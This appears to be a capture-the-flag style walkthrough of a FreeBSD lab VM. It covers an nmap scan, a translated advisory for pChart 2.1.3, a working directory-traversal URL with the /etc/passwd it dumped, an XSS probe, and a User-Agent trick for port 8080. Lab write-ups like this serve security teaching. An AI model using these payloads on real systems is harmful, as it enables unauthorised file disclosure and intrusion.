## 1.nmap

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-26 15:57 CST
Nmap scan report for 192.168.137.140
Host is up (0.00069s latency).

PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
MAC Address: 00:0C:29:A1:1A:43 (VMware)
Aggressive OS guesses: FreeBSD 7.0-RELEASE - 9.0-RELEASE (93%), Juniper MAG2600 SSL VPN gateway (IVE OS 7.3) (92%), Linksys WAP54G WAP (92%), ISS Proventia GX3002C firewall (Linux 2.4.18) (92%), Linux 2.6.20 (92%), Linux 2.6.18 (91%), Linux 2.6.23 (91%), Linux 2.6.24 (91%), FreeBSD 7.0-RC1 (91%), FreeBSD 7.0-STABLE (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

```

## 2.目录穿越

```
pChart2.1.3
#漏洞标题：pChart 2.1.3目录遍历和反射XSS
#日期：2014年1月24日
#漏洞作者：Balazs Makany
#供应商主页：www.pchart.net
#软件链接：www.pchart.net/download
#谷歌多尔克：标题：“pChart 2.x-示例”正文：“2.1.3”
#版本：2.1.3
#测试环境：N/A（Web应用程序。在FreeBSD和Apache上测试）
#CVE：无
0]摘要：
默认情况下，PHP库pChart 2.1.3（可能还有之前的版本）
包含一个示例文件夹，应用程序在其中容易受到攻击
目录遍历和跨站脚本（XSS）。
定制的生产代码包含类似的内容是合理的
如果库的使用是从示例中复制的，则会出现问题。
漏洞利用者在公开披露之前与供应商进行了接触
漏洞，因此供应商发布了官方修复程序
在漏洞发布之前。
1] 目录遍历：
"hxxp://localhost/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd"
遍历是以web服务器的权限执行的，并导致
敏感文件泄露（passwd、siteconf.inc.php或类似），
访问源代码、硬编码密码或其他高影响
后果取决于web服务器的配置。
如果示例代码为
复制到生产环境中。
目录遍历修复：
1） 更新到软件的最新版本。
2） 在适用的情况下删除对示例文件夹的公共访问。
3） 使用Web应用程序防火墙或类似技术进行过滤
恶意输入尝试。
[2] 跨站点脚本（XSS）：
"hxxp://localhost/examples/sandbox/script/session.php?<script>警报（'XSS
此文件在整个会话中使用多个变量，并且大多数
它们容易受到XSS攻击。某些参数是持久的
在整个会话期间，因此一直持续到用户会话
是活跃的。参数未经过滤。
跨站点脚本修复：
1） 更新到软件的最新版本。
2） 在适用的情况下删除对示例文件夹的公共访问。
3） 使用Web应用程序防火墙或类似技术进行过滤
恶意输入尝试。
[3] 披露时间表：
2014年1月16日-确认漏洞，联系供应商
2014年1月17日-供应商回复，已安排负责任的披露
2014年1月24日-询问供应商进度，供应商回复
并注意到官方补丁已经发布。
```

```
http://192.168.137.140/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd

# $FreeBSD: release/9.0.0/etc/master.passwd 218047 2011-01-28 22:29:38Z pjd $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
mysql:*:88:88:MySQL Daemon:/var/db/mysql:/usr/sbin/nologin
ossec:*:1001:1001:User &:/usr/local/ossec-hids:/sbin/nologin
ossecm:*:1002:1001:User &:/usr/local/ossec-hids:/sbin/nologin
ossecr:*:1003:1001:User &:/usr/local/ossec-hids:/sbin/nologin

```

```
FreeBSD apache config
读取到配置目录
/usr/local/etc/apache22/httpd.conf
找到正确的user-agent头
Mozilla/4.0 Mozilla4_browser
替换后进入192.168.137.140:8080

```

